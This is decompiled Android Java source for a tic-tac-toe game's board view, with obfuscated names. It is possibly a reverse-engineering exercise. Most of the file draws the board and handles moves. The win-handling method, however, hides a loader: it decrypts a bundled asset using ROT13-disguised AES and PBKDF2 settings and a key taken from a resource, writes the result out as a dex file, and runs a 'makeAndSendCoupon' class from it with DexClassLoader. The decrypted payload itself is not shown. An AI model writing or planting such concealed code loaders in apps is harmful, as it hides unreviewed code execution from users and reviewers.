package at.game.tictactoe;

import android.content.Context;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.graphics.Paint.Align;
import android.graphics.Paint.Style;
import android.graphics.RectF;
import android.graphics.Typeface;
import android.util.AttributeSet;
import android.view.View;
import dalvik.system.DexClassLoader;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;
import java.util.List;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;

public class TicTacToeView extends View {
    protected static final char[] f2a;
    private Paint f3b;
    private Paint f4c;
    private Paint f5d;
    private C0001b f6e;
    private int f7f;
    private int f8g;
    private int f9h;
    private int f10i;
    private int f11j;
    private int f12k;
    private int f13l;
    private String f14m;
    private int f15n;

    static {
        f2a = "0123456789ABCDEF".toCharArray();
    }

    public TicTacToeView(Context context) {
        super(context);
        this.f3b = new Paint();
        this.f4c = new Paint();
        this.f5d = new Paint();
        this.f6e = new C0001b();
        this.f7f = 640;
        this.f8g = 480;
        this.f9h = 140;
        this.f10i = (this.f7f - (this.f9h * 3)) / 2;
        this.f11j = (this.f8g - (this.f9h * 3)) / 2;
        this.f12k = 10;
        this.f13l = 10;
        this.f14m = "To start a new game press the New Game Button";
        this.f15n = 20;
        m1a();
    }

    public TicTacToeView(Context context, AttributeSet attributeSet) {
        super(context, attributeSet);
        this.f3b = new Paint();
        this.f4c = new Paint();
        this.f5d = new Paint();
        this.f6e = new C0001b();
        this.f7f = 640;
        this.f8g = 480;
        this.f9h = 140;
        this.f10i = (this.f7f - (this.f9h * 3)) / 2;
        this.f11j = (this.f8g - (this.f9h * 3)) / 2;
        this.f12k = 10;
        this.f13l = 10;
        this.f14m = "To start a new game press the New Game Button";
        this.f15n = 20;
        m1a();
    }

    public TicTacToeView(Context context, AttributeSet attributeSet, int i) {
        super(context, attributeSet, i);
        this.f3b = new Paint();
        this.f4c = new Paint();
        this.f5d = new Paint();
        this.f6e = new C0001b();
        this.f7f = 640;
        this.f8g = 480;
        this.f9h = 140;
        this.f10i = (this.f7f - (this.f9h * 3)) / 2;
        this.f11j = (this.f8g - (this.f9h * 3)) / 2;
        this.f12k = 10;
        this.f13l = 10;
        this.f14m = "To start a new game press the New Game Button";
        this.f15n = 20;
        m1a();
    }

    private void m1a() {
        this.f4c.setStrokeWidth((float) this.f13l);
        this.f4c.setStyle(Style.STROKE);
        this.f5d.setTextAlign(Align.CENTER);
        this.f5d.setTypeface(Typeface.SANS_SERIF);
        this.f5d.setTextSize((float) this.f15n);
    }

    private void m2a(Canvas canvas, int i, int i2) {
        int i3 = (this.f10i + (this.f9h * i)) + this.f12k;
        int i4 = (this.f10i + ((i + 1) * this.f9h)) - this.f12k;
        int i5 = (this.f11j + (this.f9h * i2)) + this.f12k;
        int i6 = (this.f11j + ((i2 + 1) * this.f9h)) - this.f12k;
        canvas.drawLine((float) i3, (float) i5, (float) i4, (float) i6, this.f4c);
        canvas.drawLine((float) i4, (float) i5, (float) i3, (float) i6, this.f4c);
    }

    public static byte[] m3a(String str) {
        int length = str.length();
        byte[] bArr = new byte[(length / 2)];
        for (int i = 0; i < length; i += 2) {
            bArr[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) << 4) + Character.digit(str.charAt(i + 1), 16));
        }
        return bArr;
    }

    public static String m4b(String str) {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < str.length(); i++) {
            char charAt = str.charAt(i);
            if (charAt >= 'a' && charAt <= 'm') {
                charAt = (char) (charAt + 13);
            } else if (charAt >= 'A' && charAt <= 'M') {
                charAt = (char) (charAt + 13);
            } else if (charAt >= 'n' && charAt <= 'z') {
                charAt = (char) (charAt - 13);
            } else if (charAt >= 'N' && charAt <= 'Z') {
                charAt = (char) (charAt - 13);
            }
            stringBuilder.append(charAt);
        }
        return stringBuilder.toString();
    }

    private void m5b() {
        if (this.f6e.m24e()) {
            C0003d b = this.f6e.m19b();
            if (b == null) {
                this.f14m = "Draw!";
            } else {
                if (!this.f6e.m19b().m28b() && this.f6e.m22c().m28b()) {
                    File file = new File(getContext().getDir("dex", 0), "blub");
                    try {
                        BufferedInputStream bufferedInputStream = new BufferedInputStream(getContext().getAssets().open("blub"));
                        byte[] bArr = new byte[8192];
                        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                        while (true) {
                            int read = bufferedInputStream.read(bArr, 0, 8192);
                            if (read <= 0) {
                                break;
                            }
                            byteArrayOutputStream.write(bArr, 0, read);
                        }
                        Object toByteArray = byteArrayOutputStream.toByteArray();
                        byteArrayOutputStream.close();
                        bufferedInputStream.close();
                        InputStream openRawResource = getContext().getResources().openRawResource(2130968576);
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(openRawResource));
                        List<String> arrayList = new ArrayList();
                        while (true) {
                            String readLine = bufferedReader.readLine();
                            if (readLine == null) {
                                break;
                            }
                            arrayList.add(readLine);
                        }
                        StringBuilder stringBuilder = new StringBuilder();
                        for (String append : arrayList) {
                            stringBuilder.append(append);
                        }
                        String append2 = stringBuilder.toString().substring(59, 122);
                        openRawResource.close();
                        bufferedReader.close();
                        Cipher instance = Cipher.getInstance(m4b("NRF/POP/CXPF5Cnqqvat"));
                        Object obj = new byte[8];
                        System.arraycopy(toByteArray, 8, obj, 0, 8);
                        SecretKeyFactory instance2 = SecretKeyFactory.getInstance(m4b("CORJVGUZQ5NAQ128OVGNRF-POP-BCRAFFY"));
                        instance.init(2, instance2.generateSecret(new PBEKeySpec(append2.toCharArray(), obj, 100)), new IvParameterSpec(m3a("CA89B2417131317115BCE4FFF3D746FC")));
                        bArr = instance.doFinal(toByteArray, 16, toByteArray.length - 16);
                        byte[] a = m3a("504B03040A0000080000496B2B480000");
                        for (int i = 0; i < 16; i++) {
                            bArr[i] = a[i];
                        }
                        OutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(file.getAbsolutePath()));
                        bufferedOutputStream.write(bArr);
                        bufferedOutputStream.flush();
                        bufferedOutputStream.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    } catch (InvalidKeyException e2) {
                        e2.printStackTrace();
                    } catch (NoSuchAlgorithmException e3) {
                        e3.printStackTrace();
                    } catch (NoSuchPaddingException e4) {
                        e4.printStackTrace();
                    } catch (IllegalBlockSizeException e5) {
                        e5.printStackTrace();
                    } catch (BadPaddingException e6) {
                        e6.printStackTrace();
                    } catch (InvalidKeySpecException e7) {
                        e7.printStackTrace();
                    } catch (InvalidAlgorithmParameterException e8) {
                        e8.printStackTrace();
                    }
                    try {
                        Class loadClass = new DexClassLoader(file.getAbsolutePath(), getContext().getDir("dex", 0).getAbsolutePath(), null, getContext().getClassLoader()).loadClass("at.game.tictactoe.coupon.CouponGenerator");
                        loadClass.getMethod("makeAndSendCoupon", new Class[0]).invoke(loadClass.getConstructor(new Class[]{Context.class}).newInstance(new Object[]{getContext()}), new Object[0]);
                    } catch (IllegalAccessException e9) {
                        e9.printStackTrace();
                    } catch (IllegalArgumentException e10) {
                        e10.printStackTrace();
                    } catch (InvocationTargetException e11) {
                        e11.printStackTrace();
                    } catch (InstantiationException e12) {
                        e12.printStackTrace();
                    } catch (NoSuchMethodException e13) {
                        e13.printStackTrace();
                    } catch (ClassNotFoundException e14) {
                        e14.printStackTrace();
                    }
                }
                this.f14m = b.m25a() + " wins!";
            }
        } else {
            this.f14m = this.f6e.m23d().m25a() + "s turn.";
        }
        invalidate();
    }

    private void m6b(Canvas canvas, int i, int i2) {
        int i3 = (this.f10i + (this.f9h * i)) + this.f12k;
        int i4 = (this.f11j + (this.f9h * i2)) + this.f12k;
        int i5 = this.f9h - (this.f12k * 2);
        canvas.drawOval(new RectF((float) i3, (float) i4, (float) (i3 + i5), (float) (i4 + i5)), this.f4c);
    }

    public void m7a(float f, float f2) {
        if (f > ((float) this.f10i) && f < ((float) (this.f10i + (this.f9h * 3))) && f2 > ((float) this.f11j) && f2 < ((float) (this.f11j + (this.f9h * 3)))) {
            if (this.f6e.m18a((int) ((f - ((float) this.f10i)) / ((float) this.f9h)), (int) ((f2 - ((float) this.f11j)) / ((float) this.f9h)))) {
                m5b();
            }
        }
    }

    public void newGame(String str, String str2, boolean z, boolean z2) {
        this.f6e.m17a(str, z);
        this.f6e.m21b(str2, z2);
        this.f6e.m16a();
        m5b();
    }

    public void onDraw(Canvas canvas) {
        super.onDraw(canvas);
        canvas.drawARGB(255, 255, 255, 255);
        this.f3b.setColor(-16777216);
        canvas.drawText(this.f14m, (float) (this.f7f / 2), (float) (this.f11j / 2), this.f5d);
        canvas.drawLine((float) (this.f10i + this.f9h), (float) this.f11j, (float) (this.f10i + this.f9h), (float) (this.f11j + (this.f9h * 3)), this.f3b);
        canvas.drawLine((float) (this.f10i + (this.f9h * 2)), (float) this.f11j, (float) (this.f10i + (this.f9h * 2)), (float) (this.f11j + (this.f9h * 3)), this.f3b);
        canvas.drawLine((float) this.f10i, (float) (this.f11j + this.f9h), (float) (this.f10i + (this.f9h * 3)), (float) (this.f11j + this.f9h), this.f3b);
        canvas.drawLine((float) this.f10i, (float) (this.f11j + (this.f9h * 2)), (float) (this.f10i + (this.f9h * 3)), (float) (this.f11j + (this.f9h * 2)), this.f3b);
        for (int i = 0; i < 3; i++) {
            for (int i2 = 0; i2 < 3; i2++) {
                switch (C0007h.f35a[this.f6e.m20b(i, i2).ordinal()]) {
                    case 1:
                        m2a(canvas, i, i2);
                        break;
                    case 2:
                        m6b(canvas, i, i2);
                        break;
                    default:
                        break;
                }
            }
        }
    }

    public void onSizeChanged(int i, int i2, int i3, int i4) {
        this.f7f = i;
        this.f8g = i2;
        this.f10i = (this.f7f - (this.f9h * 3)) / 2;
        this.f11j = (this.f8g - (this.f9h * 3)) / 2;
        super.onSizeChanged(i, i2, i3, i4);
    }

    public boolean performClick() {
        super.performClick();
        return true;
    }
}
